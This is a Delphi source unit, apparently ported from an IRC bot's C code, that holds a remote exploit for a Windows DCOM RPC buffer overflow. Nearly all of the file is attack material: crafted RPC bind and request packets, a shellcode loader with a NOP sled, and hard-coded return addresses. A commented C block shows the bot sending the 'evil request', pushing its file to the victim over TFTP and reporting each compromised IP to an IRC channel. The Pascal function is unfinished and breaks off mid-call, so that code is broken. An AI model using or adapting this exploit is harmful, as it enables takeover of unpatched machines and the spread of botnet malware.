unit exDCOM2;

interface

uses
  Windows,
  Winsock,
  untShellcode,
  untFunctions,
  untFTPD;

const
  DCOM2_SHELLCODE_OFFSET_IP = $16D;
  DCOM2_SHELLCODE_OFFSET_PORT = $171;
  DCOM2_SCBUF_OFFSET_SC = $24;
  DCOM2_SCBUF_BUF_MAX = $208;
  DCOM2_SCBUF_OFFSET_JMP_ADDR = DCOM2_SCBUF_BUF_MAX+DCOM2_SCBUF_OFFSET_SC+$8;
  DCOM2_SCBUF_OFFSET_TOP_SEH = DCOM2_SCBUF_OFFSET_JMP_ADDR+$4;

Type
  dcom_offset_s = record
    lTopSeh: DWord;
    lJmpAddr: DWord;
  End;

const
dcom2_offset: Array [0..2] of dcom_offset_s = (
 (lTopSeh:$7c54144c;lJmpAddr:$77a1b496), // kernel32.dll v5.0.2195.6688 / OLEAUT32.dll v2.40.4522.0
 (lTopSeh:$77eda1f0;lJmpAddr:$77a1afa9), // kernel32.dll v5.0.2195.6079 / OLEAUT32.dll v2.40.4518.0
 (lTopSeh:$41414141;lJmpAddr:$77FCC662)); // test / test

dcom2_loader: string =
	#$E8#$00#$00#$00#$00#$58#$66#$31#$C0#$40#$81#$38#$64#$63#$6F+
	#$6D#$75#$F7#$81#$78#$04#$68#$78#$30#$72#$75#$EE#$05#$08#$00#$00+
	#$00#$FF#$E0#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90+
	#$90#$90#$90;

dcom2_bindstr: string =
	#$05#$00#$0B#$03#$10#$00#$00#$00#$48#$00#$00#$00#$7F#$00#$00#$00+
	#$D0#$16#$D0#$16#$00#$00#$00#$00#$01#$00#$00#$00#$01#$00#$01#$00+
	#$a0#$01#$00#$00#$00#$00#$00#$00#$C0#$00#$00#$00#$00#$00#$00#$46+
	#$00#$00#$00#$00#$04#$5D#$88#$8A#$EB#$1C#$C9#$11#$9F#$E8#$08#$00+
	#$2B#$10#$48#$60#$02#$00#$00#$00;

dcom2_request1: string =
	#$05#$00#$00#$03#$10#$00#$00#$00#$E8#$03#$00#$00#$E5#$00#$00#$00+
	#$D0#$03#$00#$00#$01#$00#$04#$00#$05#$00#$06#$00#$01#$00#$00#$00+
	#$00#$00#$00#$00#$32#$24#$58#$FD#$CC#$45#$64#$49#$B0#$70#$DD#$AE+
	#$74#$2C#$96#$D2#$60#$5E#$0D#$00#$01#$00#$00#$00#$00#$00#$00#$00+
	#$70#$5E#$0D#$00#$02#$00#$00#$00#$7C#$5E#$0D#$00#$00#$00#$00#$00+
	#$10#$00#$00#$00#$80#$96#$F1#$F1#$2A#$4D#$CE#$11#$A6#$6A#$00#$20+
	#$AF#$6E#$72#$F4#$0C#$00#$00#$00#$4D#$41#$52#$42#$01#$00#$00#$00+
	#$00#$00#$00#$00#$0D#$F0#$AD#$BA#$00#$00#$00#$00#$A8#$F4#$0B#$00+
	#$60#$03#$00#$00#$60#$03#$00#$00#$4D#$45#$4F#$57#$04#$00#$00#$00+
	#$A2#$01#$00#$00#$00#$00#$00#$00#$C0#$00#$00#$00#$00#$00#$00#$46+
	#$38#$03#$00#$00#$00#$00#$00#$00#$C0#$00#$00#$00#$00#$00#$00#$46+
	#$00#$00#$00#$00#$30#$03#$00#$00#$28#$03#$00#$00#$00#$00#$00#$00+
	#$01#$10#$08#$00#$CC#$CC#$CC#$CC#$C8#$00#$00#$00#$4D#$45#$4F#$57+
	#$28#$03#$00#$00#$D8#$00#$00#$00#$00#$00#$00#$00#$02#$00#$00#$00+
	#$07#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$00#$00#$00#$00#$C4#$28#$CD#$00#$64#$29#$CD#$00#$00#$00#$00#$00+
	#$07#$00#$00#$00#$B9#$01#$00#$00#$00#$00#$00#$00#$C0#$00#$00#$00+
	#$00#$00#$00#$46#$AB#$01#$00#$00#$00#$00#$00#$00#$C0#$00#$00#$00+
	#$00#$00#$00#$46#$A5#$01#$00#$00#$00#$00#$00#$00#$C0#$00#$00#$00+
	#$00#$00#$00#$46#$A6#$01#$00#$00#$00#$00#$00#$00#$C0#$00#$00#$00+
	#$00#$00#$00#$46#$A4#$01#$00#$00#$00#$00#$00#$00#$C0#$00#$00#$00+
	#$00#$00#$00#$46#$AD#$01#$00#$00#$00#$00#$00#$00#$C0#$00#$00#$00+
	#$00#$00#$00#$46#$AA#$01#$00#$00#$00#$00#$00#$00#$C0#$00#$00#$00+
	#$00#$00#$00#$46#$07#$00#$00#$00#$60#$00#$00#$00#$58#$00#$00#$00+
	#$90#$00#$00#$00#$40#$00#$00#$00#$20#$00#$00#$00#$78#$00#$00#$00+
	#$30#$00#$00#$00#$01#$00#$00#$00#$01#$10#$08#$00#$CC#$CC#$CC#$CC+
	#$50#$00#$00#$00#$4F#$B6#$88#$20#$FF#$FF#$FF#$FF#$00#$00#$00#$00+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$00#$00#$00#$00#$00#$00#$00#$00#$01#$10#$08#$00#$CC#$CC#$CC#$CC+
	#$48#$00#$00#$00#$07#$00#$66#$00#$06#$09#$02#$00#$00#$00#$00#$00+
	#$C0#$00#$00#$00#$00#$00#$00#$46#$10#$00#$00#$00#$00#$00#$00#$00+
	#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00#$78#$19#$0C#$00+
	#$58#$00#$00#$00#$05#$00#$06#$00#$01#$00#$00#$00#$70#$D8#$98#$93+
	#$98#$4F#$D2#$11#$A9#$3D#$BE#$57#$B2#$00#$00#$00#$32#$00#$31#$00+
	#$01#$10#$08#$00#$CC#$CC#$CC#$CC#$80#$00#$00#$00#$0D#$F0#$AD#$BA+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$18#$43#$14#$00#$00#$00#$00#$00#$60#$00#$00#$00#$60#$00#$00#$00+
	#$4D#$45#$4F#$57#$04#$00#$00#$00#$C0#$01#$00#$00#$00#$00#$00#$00+
	#$C0#$00#$00#$00#$00#$00#$00#$46#$3B#$03#$00#$00#$00#$00#$00#$00+
	#$C0#$00#$00#$00#$00#$00#$00#$46#$00#$00#$00#$00#$30#$00#$00#$00+
	#$01#$00#$01#$00#$81#$C5#$17#$03#$80#$0E#$E9#$4A#$99#$99#$F1#$8A+
	#$50#$6F#$7A#$85#$02#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$01#$00#$00#$00+
	#$01#$10#$08#$00#$CC#$CC#$CC#$CC#$30#$00#$00#$00#$78#$00#$6E#$00+
	#$00#$00#$00#$00#$D8#$DA#$0D#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$20#$2F#$0C#$00#$00#$00#$00#$00#$00#$00#$00#$00#$03#$00#$00#$00+
	#$00#$00#$00#$00#$03#$00#$00#$00#$46#$00#$58#$00#$00#$00#$00#$00+
	#$01#$10#$08#$00#$CC#$CC#$CC#$CC#$10#$00#$00#$00#$30#$00#$2E#$00+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$01#$10#$08#$00#$CC#$CC#$CC#$CC#$68#$00#$00#$00#$0E#$00#$FF#$FF+
	#$68#$8B#$0B#$00#$02#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00;

dcom2_request2: string =
	#$20#$00#$00#$00#$00#$00#$00#$00#$20#$00#$00#$00#$5C#$00#$5C#$00;

dcom2_request3: string =
	#$5C#$00#$43#$00#$24#$00#$5C#$00#$31#$00#$32#$00#$33#$00#$34#$00+
	#$35#$00#$36#$00#$31#$00#$31#$00#$31#$00#$31#$00#$31#$00#$31#$00+
	#$31#$00#$31#$00#$31#$00#$31#$00#$31#$00#$31#$00#$31#$00#$31#$00+
	#$31#$00#$2E#$00#$64#$00#$6F#$00#$63#$00#$00#$00;

dcom2_request4: string =
	#$01#$10#$08#$00#$CC#$CC#$CC#$CC#$20#$00#$00#$00#$30#$00#$2D#$00+
	#$00#$00#$00#$00#$88#$2A#$0C#$00#$02#$00#$00#$00#$01#$00#$00#$00+
	#$28#$8C#$0C#$00#$01#$00#$00#$00#$07#$00#$00#$00#$00#$00#$00#$00;

dcom2_shellcode_buf: string =
	#$31#$00#$32#$00#$37#$00#$2e#$00#$30#$00#$2e#$00+
	#$30#$00#$2e#$00#$31#$00#$5c#$00#$49#$00#$50#$00+
	#$43#$00#$24#$00#$5c#$00+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'+
	#$e9#$f3#$fd#$ff#$ff+
	'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE';

implementation

Function DoDCOM2(Address: String; Port: Integer; _Sock: TSocket): Boolean;
Var
  SendBuf       :Array[0..4096] Of Char;
  pTemp         :Pointer;
  szRecvBuf     :Array[0..4096] Of Char;
  szLoadBuf     :Array[0..4096] Of Char;
  szReqBuf      :Array[0..4096] Of Char;
  szShellBuf    :Array[0..4096] Of Char;
  szLoaderBuf   :Array[0..4096] Of Char;
  iShellSize    :Integer;
  iLoaderSize   :Integer;
  iPos          :Integer;
  iSCSize       :Integer;
  iLoadSize     :Integer;
  iReqSize      :Integer;

  Sock          :TSocket;
  Addr          :TSockAddrIn;
Begin
  Result := False;

  If _Sock = INVALID_SOCKET Then
  Begin
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(Port);
    Addr.sin_addr.S_addr := inet_addr(pchar(address));
//    If Connect(Sock, Addr, SizeOf(Addr)) <> 0 Then Exit;
  End;

  iShellSize := GetRNS0TerminatedShellCode(
End;

end.

(*
iShellSize = GetRNS0TerminatedShellcode(szShellBuf, 4096, GetIP(exinfo.sock), filename);
	if (!iShellSize) return 0;

	iLoaderSize = EncodeRNS0(szLoaderBuf, 4096, dcom2_loader, sizeof(dcom2_loader)-1);

	memcpy(szLoadBuf+iPos,							dcom2_shellcode_buf,	sizeof(dcom2_shellcode_buf)		); iPos+=sizeof(dcom2_shellcode_buf);
	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_SC,			szLoaderBuf,			iLoaderSize						);
	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_SC,			szShellBuf,             iShellSize	);
	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_JMP_ADDR,	&dcom2_my_offsets[0].lJmpAddr,	4						);
	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_TOP_SEH, 	&dcom2_my_offsets[0].lTopSEH,	4						);
	iLoadSize = iPos; iPos = 0;

	pTemp = szReqBuf+sizeof(dcom2_request1)-1; // Fill the request with the right sizes
	*(unsigned long* )(pTemp)		= *(unsigned long* )(pTemp)		+ iLoadSize / 2;
	*(unsigned long* )(pTemp+8)		= *(unsigned long* )(pTemp+8)	+ iLoadSize / 2; pTemp=szReqBuf;
    *(unsigned long* )(pTemp+8)		= *(unsigned long* )(pTemp+8)	+ iLoadSize - 12;
	*(unsigned long* )(pTemp+16)		= *(unsigned long* )(pTemp+16)	+ iLoadSize - 12;
	*(unsigned long* )(pTemp+128)	= *(unsigned long* )(pTemp+128)	+ iLoadSize - 12;
	*(unsigned long* )(pTemp+132)	= *(unsigned long* )(pTemp+132)	+ iLoadSize - 12;
	*(unsigned long* )(pTemp+180)	= *(unsigned long* )(pTemp+180)	+ iLoadSize - 12;
	*(unsigned long* )(pTemp+184)	= *(unsigned long* )(pTemp+184)	+ iLoadSize - 12;
	*(unsigned long* )(pTemp+208)	= *(unsigned long* )(pTemp+208)	+ iLoadSize - 12;
	*(unsigned long* )(pTemp+396)	= *(unsigned long* )(pTemp+396)	+ iLoadSize - 12;

	// connect with target IP
	int iErr = fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
	if (iErr==-1) { // connect failed, exit
		fclosesocket(sSocket);
		return FALSE;
	}

	// send the bind string
	if (fsend(sSocket, dcom2_bindstr, sizeof(dcom2_bindstr)-1, 0) == SOCKET_ERROR) {
		fclosesocket(sSocket);
		return FALSE;
	}

	// read reply
	frecv(sSocket, szRecvBuf, 4096, 0);

	// Check for DCE_PKT_BINDACK
	if (szRecvBuf[2] != DCE_PKT_BINDACK) {
		fclosesocket(sSocket);
		return FALSE;
	}

	// send evil request
	if (fsend(sSocket, szReqBuf, iReqSize, 0) == SOCKET_ERROR) {
		fclosesocket(sSocket);
		return FALSE;
	}

	// read reply
	frecv(sSocket, szRecvBuf, 4096, 0);

	if (szRecvBuf[2] == DCE_PKT_FAULT) {
		fclosesocket(sSocket);
		return FALSE;
	}

	fclosesocket(sSocket);

	sprintf(sendbuf,"[TFTP]: File transfer complete to IP: %s", exinfo.ip);
	for (int i=0; i < 6; i++) {
		if (searchlog(sendbuf)) {
			sprintf(sendbuf, "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
			if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
			addlog(sendbuf);
			exploit[exinfo.exploit].stats++;

			break;
		}
		Sleep(5000);
	}

	return TRUE;
}
#endif
*)